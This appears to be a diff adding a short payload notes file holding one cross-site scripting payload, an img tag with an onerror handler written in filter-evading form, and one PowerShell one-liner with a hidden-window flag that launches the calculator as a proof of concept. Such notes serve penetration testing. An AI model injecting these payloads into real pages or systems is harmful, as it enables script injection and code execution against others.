@@ -1,0 +1,4 @@
+xss:<img/src=` onerror=confirm`Test`>
+
+powershell:
+1)powershell -w 1 -C "calc.exe"
